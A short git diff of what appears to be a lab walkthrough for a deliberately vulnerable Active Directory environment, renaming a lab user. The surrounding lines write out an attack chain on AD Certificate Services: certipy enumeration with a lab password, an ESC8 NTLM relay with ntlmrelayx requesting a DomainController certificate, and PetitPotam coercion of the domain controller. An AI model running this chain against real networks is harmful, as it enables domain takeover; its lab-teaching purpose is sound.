@@ -47,11 +47,11 @@ CA=10.10.0.12
 nmap -p 80,135,389,445,3389,5985 -sV $CA
 curl -sk http://$CA/certsrv/                                 # 401 NTLM
 # Authenticated:
-certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -vulnerable -stdout
-certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -enabled -stdout
+certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -vulnerable -stdout
+certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -enabled -stdout
 # ESC8 path (no creds needed if you have coercion):
 ntlmrelayx.py -t http://$CA/certsrv/certfnsh.asp --adcs --template DomainController
-python3 PetitPotam.py -d corp.local -u alice -p 'DVADlab2024!' attacker 10.10.0.10
+python3 PetitPotam.py -d corp.local -u peter.parker -p 'DVADlab2024!' attacker 10.10.0.10
 ```
 
 ## Forward to
